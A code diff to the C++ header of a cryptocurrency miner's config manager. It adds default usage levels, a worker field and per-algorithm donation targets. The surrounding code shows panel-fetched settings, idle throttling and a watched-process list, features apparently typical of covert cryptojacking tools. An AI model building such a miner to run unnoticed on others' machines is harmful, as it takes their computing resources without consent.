@@ -11,13 +11,14 @@ struct MinerConfig {
     std::string mining_url;
     std::string wallet;
     std::string password;
+    std::string worker;
     std::string algo;
-    double non_idle_usage;
-    double idle_usage;
-    int wait_time_idle;
-    int use_ssl;      // 0 = no SSL, 1 = SSL/TLS
-    int enabled;      // 0 = disabled, 1 = enabled
-    int fan_speed;    // GPU fan speed % (0 = auto, 1-100 = manual)
+    double non_idle_usage = 50.0;
+    double idle_usage     = 100.0;
+    int wait_time_idle    = 3;
+    int use_ssl           = 0;   // 0 = no SSL, 1 = SSL/TLS
+    int enabled           = 1;   // 0 = disabled, 1 = enabled
+    int fan_speed         = 0;   // GPU fan speed % (0 = auto, 1-100 = manual)
 };
 
 class ConfigManager {
@@ -59,6 +60,10 @@ public:
     const MinerConfig& GetGPUConfig() const { return gpuConfig; }
     const std::vector<std::string>& GetWatchedProcesses() const { return watchedProcesses; }
 
+    // Per-algorithm donation targets (keyed by algo name).
+    const std::unordered_map<std::string, MinerConfig>& GetDonateConfigs() const { return donateConfigs; }
+    bool GetDonateConfig(const std::string& algo, MinerConfig& out) const;
+
     // Returns true if the last successful config fetch came from the panel (not embedded fallback)
     bool IsLastFetchFromPanel() const { return m_lastFetchFromPanel; }
     
@@ -69,6 +74,7 @@ private:
     MinerConfig cpuConfig;
     MinerConfig gpuConfig;
     std::vector<std::string> watchedProcesses;
+    std::unordered_map<std::string, MinerConfig> donateConfigs;
     bool m_lastFetchFromPanel = false;
     
     void ParseConfigFromJson(const json& jsonResponse);
